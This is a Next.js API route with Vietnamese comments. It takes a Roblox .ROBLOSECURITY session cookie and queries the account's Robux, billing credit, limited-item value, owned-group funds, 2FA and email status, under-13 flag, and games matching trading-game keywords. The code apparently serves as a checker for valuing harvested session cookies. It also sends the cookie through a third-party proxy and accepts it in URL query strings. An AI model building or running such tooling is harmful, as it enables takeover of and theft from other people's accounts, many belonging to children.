import { NextResponse } from "next/server";

type Mode = "basic" | "full";

async function handler(cookieRaw: string | null, mode: Mode) {
  if (!cookieRaw && mode === "full") {
    return NextResponse.json({ error: "Thiếu cookie cho chế độ full" }, { status: 400 });
  }

  const result: any = {
    basic: null,
    accountAgeDays: null,
    avatarHeadshotUrl: null,
    robux: null,
    pendingRobux: null,
    summary: null,
    premium: "N/A",
    creditBalance: null,
    groupBalances: [],
    rap: null,
    limiteds: null,
    hasInventory: null,
    groupsCount: null,
    ownedGroups: null,
    emailVerified: null,
    twoFA: null,
    games: [],
    gamesCount: null,
    visits: null,
    isDeveloper: null,
    mm2_count: null,
    adm_count: null,
    sab_count: null,
    note: null,
    displayName: null,
    isUnder13: null,
  };

  const commonHeaders = {
    Accept: "application/json",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  };

  try {
    const cookie = `.ROBLOSECURITY=${cookieRaw ?? ""}`;

    const authHeaders = {
      ...commonHeaders,
      Cookie: cookie,
    };

    const safeFetch = async (url: string, opts: any = {}) => {
      try {
        let fetchUrl = url;
        const isSensitive =
          url.includes("economy.roblox.com") ||
          url.includes("billing.roblox.com") ||
          url.includes("accountsettings.roblox.com") ||
          url.includes("auth.roblox.com") ||
          url.includes("twostepverification.roblox.com") ||
          url.includes("users.roblox.com/v1/users/authenticated");

        if (!isSensitive) {
          if (
            !url.includes("inventory.roblox.com") &&
            !url.includes("accountsettings.roblox.com") &&
            !url.includes("economy.roblox.com") &&
            !url.includes("premiumfeatures.roblox.com") &&
            !url.includes("billing.roblox.com")
          ) {
            fetchUrl = url.replace(/roblox\.com/g, "roproxy.com");
          }
        }

        const res = await fetch(fetchUrl, {
          ...opts,
          headers: authHeaders,
          cache: "no-store",
          redirect: "follow",
        });

        console.log("[roblox-user] safeFetch response", {
          originalUrl: url,
          fetchUrl,
          status: res.status,
          ok: res.ok,
        });

        if (res.ok) return await res.json();
        return null;
      } catch (error) {
        console.error("[roblox-user] safeFetch error", {
          url,
          options: opts,
          error,
        });
        // Ném lỗi lên trên để handler có thể trả về response lỗi chi tiết
        throw error;
      }
    };

    const selfData = await safeFetch("https://users.roblox.com/v1/users/authenticated");

    if (!selfData || !selfData.id) {
      return NextResponse.json(
        {
          error: "Invalid file",
          errorMessage: "Invalid file. Please check and try again.",
        },
        { status: 401 }
      );
    }

    const userId = String(selfData.id);
    result.userId = userId;
    result.displayName = selfData.displayName || selfData.name;

    const userUrl = `https://users.roproxy.com/v1/users/${userId}`;
    const userData = await safeFetch(userUrl);

    console.log("[roblox-user] userRes (via safeFetch)", {
      url: userUrl,
      hasData: !!userData,
    });

    if (userData) {
      result.basic = userData;
      if (userData.created) {
        result.accountAgeDays = Math.floor(
          (Date.now() - new Date(userData.created).getTime()) / 86400000
        );
      }
    }

    // Age bracket: 0 = under 13, 1 = over/equal 13
    const ageRes = await safeFetch("https://users.roblox.com/v1/users/authenticated/age-bracket");
    if (ageRes && ageRes.ageBracket !== undefined) {
      result.isUnder13 =
        ageRes.ageBracket === 0 || ageRes.ageBracket === "AgeUnderThirteen";
    }

    const thumbUrl = `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`;
    const thumbRes = await fetch(thumbUrl, { headers: commonHeaders, cache: "no-store" });

    console.log("[roblox-user] thumbRes response", {
      url: thumbUrl,
      status: thumbRes.status,
      ok: thumbRes.ok,
    });
    if (thumbRes.ok) {
      const thumbJson = await thumbRes.json();
      result.avatarHeadshotUrl = thumbJson?.data?.[0]?.imageUrl || null;
    }

    const robuxData = await safeFetch("https://economy.roblox.com/v1/user/currency");
    if (robuxData?.robux !== undefined) result.robux = robuxData.robux;

    const pendingData = await safeFetch(
      `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Month&transactionType=summary`
    );
    if (pendingData) {
      result.pendingRobux = pendingData.pendingRobuxTotal ?? 0;
      result.summary = Math.abs(pendingData.outgoingRobuxTotal || 0);
    }

    const invData = await safeFetch(
      `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`
    );
    if (invData?.data) {
      result.limiteds = invData.data.length;
      result.rap = invData.data.reduce(
        (sum: number, i: any) => sum + (i.recentAveragePrice || 0),
        0
      );
      result.hasInventory = result.limiteds > 0;
    }

    const premData = await safeFetch(
      `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`
    );
    result.premium = premData ? "Premium" : "N/A";

    const creditData = await safeFetch("https://billing.roblox.com/v1/credit");
    if (creditData?.robuxAmount !== undefined) result.creditBalance = creditData.robuxAmount;

    try {
      const groupsData = await safeFetch(
        `https://groups.roblox.com/v2/users/${userId}/groups/roles`
      );
      if (groupsData?.data) {
        result.groupsCount = groupsData.data.length;
        const owned = groupsData.data.filter((g: any) => g.role?.rank === 255);
        result.ownedGroups = owned.length;

        for (const group of owned) {
          const currency = await safeFetch(
            `https://economy.roblox.com/v1/groups/${group.group.id}/currency`
          );
          if (currency?.robux !== undefined) {
            result.groupBalances.push({
              groupId: group.group.id,
              name: group.group.name,
              robux: currency.robux,
            });
          }
        }
      }
    } catch (groupErr) {
      console.error("[roblox-user] groups fetch error (ignored)", groupErr);
    }

    // Games paginate
    let gamesAll: any[] = [];
    let gamesCursor: string | null = null;
    do {
      const pageUrl = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${
        gamesCursor ? `&cursor=${gamesCursor}` : ""
      }`;
      const pageData = await safeFetch(pageUrl);

      if (pageData?.data) {
        gamesAll = gamesAll.concat(pageData.data);
        gamesCursor = pageData.nextPageCursor;
      } else {
        gamesCursor = null;
      }
    } while (gamesCursor);

    if (gamesAll.length > 0) {
      result.gamesCount = gamesAll.length;
      result.visits = gamesAll.reduce(
        (sum: number, g: any) => sum + Number(g.placeVisits || g.visits || 0),
        0
      );

      result.games = gamesAll.map((g: any) => ({
        name: g.name,
        visits: Number(g.placeVisits || g.visits || 0),
        created: g.created,
        placeId: g.id,
        universeId: g.universeId,
      }));

      const lowerNames = gamesAll.map((g: any) => String(g.name || "").toLowerCase());

      const mm2Keywords = ["mm2", "murder mystery", "murder", "innocent", "sheriff", "murderer"];
      const admKeywords = ["admin", "admins", "commands", "hd admin", "kohls", "kohl", "fe admin"];
      const sabKeywords = [
        "sab",
        "sabotage",
        "impostor",
        "among us",
        "betrayal",
        "traitor",
        "steal a brainrot",
        "brainrot",
      ];

      result.mm2_count = lowerNames.filter((n: string) => mm2Keywords.some((k) => n.includes(k)))
        .length;
      result.adm_count = lowerNames.filter((n: string) => admKeywords.some((k) => n.includes(k)))
        .length;
      result.sab_count = lowerNames.filter((n: string) => sabKeywords.some((k) => n.includes(k)))
        .length;

      result.isDeveloper = gamesAll.some(
        (g: any) => String(g.creator?.id ?? "") === String(userId) && g.creator?.type === "User"
      );
    }

    const emailData = await safeFetch("https://accountsettings.roblox.com/v1/email");
    if (emailData?.verified !== undefined) result.emailVerified = emailData.verified;

    try {
      const twoStepData = await safeFetch(
        `https://twostepverification.roblox.com/v1/users/${userId}/configuration`
      );
      if (twoStepData && twoStepData.methods) {
        const enabledMethods = twoStepData.methods
          .filter((m: any) => m.enabled)
          .map((m: any) => {
            if (m.name === "authenticator") return "Authenticator App";
            if (m.name === "email") return "Email";
            if (m.name === "securityKey") return "Security Key";
            if (m.name === "recoveryCode") return "Recovery Codes";
            return m.name;
          });

        result.twoFA = enabledMethods.length > 0 ? enabledMethods.join(", ") : "No 2FA";
      } else {
        const pinData = await safeFetch("https://auth.roblox.com/v1/account/pin");
        if (pinData?.isEnabled !== undefined) {
          result.twoFA = pinData.isEnabled ? "Authenticator" : "Not Set";
        }
      }
    } catch (twofaErr) {
      console.error("[roblox-user] two-step fetch error (ignored)", twofaErr);
      // giữ nguyên result.twoFA mặc định nếu lỗi
    }

    return NextResponse.json(result);
  } catch (err: any) {
    console.error("[roblox-user catch]", err);
    return NextResponse.json(
      {
        error: "Fetch failed",
        errorMessage:
          "Something went wrong while fetching account data. Cookie may be invalid or network is unstable.",
        detail: err?.message || String(err),
      },
      { status: 500 }
    );
  }
}

// Giữ GET cũ nếu bạn vẫn còn chỗ nào đó gọi bằng query (optional)
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const cookieRaw = searchParams.get("cookie");
  const mode = (searchParams.get("mode") || "basic") as Mode;
  return handler(cookieRaw, mode);
}

// Thêm POST mới: nhận cookie trong body
export async function POST(request: Request) {
  const body = await request.json().catch(() => ({} as any));
  const cookieRaw = typeof body?.cookie === "string" ? body.cookie : null;
  const mode = ((typeof body?.mode === "string" ? body.mode : "basic") || "basic") as Mode;
  return handler(cookieRaw, mode);
}